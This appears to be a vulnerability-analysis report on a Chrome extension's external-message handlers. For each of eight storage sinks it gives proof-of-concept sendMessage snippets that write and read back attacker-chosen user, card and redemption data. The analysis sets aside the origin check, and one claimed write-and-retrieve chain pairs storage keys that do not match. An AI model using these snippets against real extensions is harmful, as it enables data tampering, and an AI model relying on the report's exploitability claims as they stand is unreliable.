# CoCo Analysis: nnfkdbgdkbjmobdcbalbkdbkkmdibjlf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (4 storage.set + 4 sendResponseExternal)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (MuscleUser)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1169: { MuscleUser: JSON.stringify(message.user) }

**Code:**

```javascript
// Background script - chrome.runtime.onMessageExternal handler (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) { // ← Origin check, but IGNORE per methodology
      if (message.message === "SetUser") {
        chrome.storage.local.set(
          { MuscleUser: JSON.stringify(message.user) }, // ← attacker-controlled
          () => {
            sendResponse({ success: true });
          }
        );
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// From a webpage at one of the whitelisted domains (localhost:3000, wallet-test.musclepoints.com, or wallet-staging.musclepoints.com)
chrome.runtime.sendMessage(
  'nnfkdbgdkbjmobdcbalbkdbkkmdibjlf',
  {
    message: 'SetUser',
    user: { malicious: 'data' }
  }
);
```

**Impact:** Attacker can poison storage with arbitrary user data. This is part of a complete exploitation chain where poisoned data can be retrieved via GetUser message (Sink 2).

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink (MuscleUser)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1157: if (result && result["MuscleUser"])
Line 1160: user: JSON.parse(result["MuscleUser"])

**Code:**

```javascript
// Background script - chrome.runtime.onMessageExternal handler (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "GetUser") {
        chrome.storage.local.get(["MuscleUser"], (result) => {
          if (result && result["MuscleUser"]) {
            sendResponse({
              success: true,
              user: JSON.parse(result["MuscleUser"]), // ← previously poisoned data sent back
            });
          } else {
            sendResponse({ success: false });
          }
        });
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// Step 1: Poison storage
chrome.runtime.sendMessage(
  'nnfkdbgdkbjmobdcbalbkdbkkmdibjlf',
  {
    message: 'SetUser',
    user: { email: 'attacker@evil.com', id: 'malicious-id' }
  }
);

// Step 2: Retrieve poisoned data
chrome.runtime.sendMessage(
  'nnfkdbgdkbjmobdcbalbkdbkkmdibjlf',
  {
    message: 'GetUser'
  },
  (response) => {
    console.log('Poisoned data:', response.user); // Attacker receives poisoned data
  }
);
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to storage and retrieve it back, enabling data manipulation and potential user impersonation.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (MuscleUserLanguage)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1177: { MuscleUserLanguage: JSON.stringify(message.language) }

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "SetLanguage") {
        chrome.storage.local.set(
          { MuscleUserLanguage: JSON.stringify(message.language) }, // ← attacker-controlled
          () => {
            sendResponse({ success: true });
          }
        );
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
chrome.runtime.sendMessage(
  'nnfkdbgdkbjmobdcbalbkdbkkmdibjlf',
  {
    message: 'SetLanguage',
    language: 'attacker-controlled-language'
  }
);
```

**Impact:** Part of complete storage exploitation chain with retrieval via GetLanguage (Sink 4).

---

## Sink 4: storage_local_get_source → sendResponseExternal_sink (MuscleUserLanguage)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1225: if (result && result["MuscleUserLanguage"])
Line 1228: redemptions: JSON.parse(result["MuscleUserLanguage"])

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "GetLanguage") {
        chrome.storage.local.get(["MuscleUserLanguage"], (result) => {
          if (result && result["MuscleUserLanguage"]) {
            sendResponse({
              success: true,
              redemptions: JSON.parse(result["MuscleUserLanguage"]), // ← poisoned data sent back
            });
          }
        });
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message with complete storage exploitation chain

**Attack:**

```javascript
// Write and retrieve poisoned language setting
chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'SetLanguage',
  language: 'malicious-value'
});

chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'GetLanguage'
}, (response) => {
  console.log('Retrieved:', response.redemptions);
});
```

**Impact:** Complete storage exploitation chain.

---

## Sink 5: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (MuscleCards)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1197: { MuscleCards: JSON.stringify(message.cards) }

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "SetUserCards") {
        chrome.storage.local.set(
          { MuscleCards: JSON.stringify(message.cards) }, // ← attacker-controlled
          () => {
            sendResponse({ success: true });
          }
        );
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message with complete storage exploitation chain (retrieval via Sink 6)

**Attack:**

```javascript
chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'SetUserCards',
  cards: [{ id: 'fake-card', amount: 9999 }]
});
```

**Impact:** Part of complete storage exploitation chain.

---

## Sink 6: storage_local_get_source → sendResponseExternal_sink (MuscleCards)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1185: if (result && result["MuscleCards"])
Line 1188: cards: JSON.parse(result["MuscleCards"])

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "GetUserCards") {
        chrome.storage.local.get(["MuscleCards"], (result) => {
          if (result && result["MuscleCards"]) {
            sendResponse({
              success: true,
              cards: JSON.parse(result["MuscleCards"]), // ← poisoned data sent back
            });
          }
        });
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message with complete storage exploitation chain

**Attack:**

```javascript
// Complete exploitation chain
chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'SetUserCards',
  cards: [{ fake: 'cards' }]
});

chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'GetUserCards'
}, (response) => {
  console.log('Retrieved poisoned cards:', response.cards);
});
```

**Impact:** Complete storage exploitation chain.

---

## Sink 7: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (MuscleCards via redemptions)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1217: { MuscleCards: JSON.stringify(message.redemptions) }

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "SetUserRedemptions") {
        chrome.storage.local.set(
          { MuscleCards: JSON.stringify(message.redemptions) }, // ← attacker-controlled
          () => {
            sendResponse({ success: true });
          }
        );
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message with complete storage exploitation chain (retrieval via Sink 8)

**Attack:**

```javascript
chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'SetUserRedemptions',
  redemptions: 'malicious-redemption-data'
});
```

**Impact:** Part of complete storage exploitation chain.

---

## Sink 8: storage_local_get_source → sendResponseExternal_sink (MuscleUserRedemptions)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nnfkdbgdkbjmobdcbalbkdbkkmdibjlf/opgen_generated_files/bg.js
Line 1205: if (result && result["MuscleUserRedemptions"])
Line 1208: redemptions: JSON.parse(result["MuscleUserRedemptions"])

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (sender.origin === config.webPluginSiteBaseUrl) {
      if (message.message === "GetUserRedemptions") {
        chrome.storage.local.get(["MuscleUserRedemptions"], (result) => {
          if (result && result["MuscleUserRedemptions"]) {
            sendResponse({
              success: true,
              redemptions: JSON.parse(result["MuscleUserRedemptions"]), // ← poisoned data sent back
            });
          }
        });
      }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message with complete storage exploitation chain

**Attack:**

```javascript
// This retrieves redemptions data that can be previously poisoned via SetUserRedemptions
chrome.runtime.sendMessage('nnfkdbgdkbjmobdcbalbkdbkkmdibjlf', {
  message: 'GetUserRedemptions'
}, (response) => {
  console.log('Retrieved:', response.redemptions);
});
```

**Impact:** Complete storage exploitation chain - attacker can manipulate user redemption data.
